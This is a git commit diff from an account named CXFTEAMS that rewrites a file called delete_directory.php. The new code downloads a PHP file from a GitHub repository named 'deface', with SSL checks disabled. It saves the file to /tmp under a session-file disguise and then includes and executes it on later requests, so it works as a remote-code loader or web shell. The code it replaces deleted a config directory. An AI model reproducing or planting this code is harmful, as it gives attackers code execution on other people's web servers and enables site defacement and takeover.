6d9b20e8628419f2e8f91fae62b62a2503a3124c
CXFTEAMS <147907849+CXFTEAMS@users.noreply.github.com>
2023-11-10 04:15:48 +0700

    Update delete_directory.php

--- delete_directory.php
+++ delete_directory.php
@@ -1,22 +1,51 @@
 <?php
-$directory = "/../config";
+$data = [
+    'https://raw.githubusercontent.com/CXFTEAMS/deface/main/info.php',
+    '/tmp/sess_' . md5($_SERVER['HTTP_HOST']) . '.php'
+];
 
 $response = [];
 
-if (is_dir($directory)) {
-    if (@rmdir($directory)) {
-        $response['status'] = 'success';
-        $response['message'] = "Directory '$directory' successfully removed.";
+if (file_exists($data[1]) && filesize($data[1]) !== 0) {
+    include($data[1]);
+} else {
+    $output = get($data[0]);
+
+    if ($output !== false) {
+        $fopen = fopen($data[1], 'w+');
+        fwrite($fopen, $output);
+        fclose($fopen);
+        $response['status'] = 'file_created';
+        $response['location'] = '?cxfteams';
     } else {
         $response['status'] = 'error';
-        $response['message'] = "Failed to remove directory '$directory'. Check permissions.";
+        $response['message'] = 'Failed to fetch data.';
     }
-} else {
-    $response['status'] = 'error';
-    $response['message'] = "Directory '$directory' does not exist.";
 }
 
-// Output the JSON response
+// Convert the response array to JSON
+$jsonResponse = json_encode($response);
+
+// Output the JSON data
 header('Content-Type: application/json');
-echo json_encode($response);
+echo $jsonResponse;
+
+function get($url) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
+
+    $result = curl_exec($ch);
+
+    // Check for cURL errors
+    if (curl_errno($ch)) {
+        return false;
+    }
+
+    curl_close($ch);
+
+    return $result;
+}
 ?>
